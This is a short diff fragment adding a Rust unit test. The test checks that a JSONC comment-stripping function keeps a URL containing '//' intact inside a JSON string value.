+        let result = strip_jsonc_comments(input);
+        let parsed: serde_json::Value = serde_json::from_str(&result).unwrap();
+        assert_eq!(
+            parsed.get("url").unwrap().as_str().unwrap(),
+            "http://example.com/path"
+        );
     }
 }
